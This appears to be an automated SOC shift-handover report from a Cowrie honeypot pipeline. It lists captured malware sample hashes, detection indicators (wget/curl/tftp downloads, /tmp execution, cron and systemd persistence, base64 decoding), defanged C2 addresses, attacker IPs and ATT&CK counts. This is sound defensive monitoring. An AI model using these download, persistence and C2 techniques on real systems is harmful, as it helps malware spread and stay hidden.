| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `87.106.65[.]126` | GB | IONOS SE | **100** ⚠️ | 50 |
| `107.150.123[.]48` | HK | UCLOUD | **100** ⚠️ | 18 |
| `137.184.5[.]188` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `195.178.110[.]227` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `116.206.193[.]37` | MM | Myanmar Country Co Ltd | **100** ⚠️ | 5 |
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 50 |
| `137.184.169[.]96` | CA | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `51.254.103[.]32` | FR | OVH SAS | **100** ⚠️ | 50 |
| `193.112.192[.]91` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 34 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 10 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 2 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 46 cases |
| Tool 34  | Credential Extractor        | ✅ 882 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (21.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 25 priority case(s) shown individually · 11 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-23T02:26:37Z_
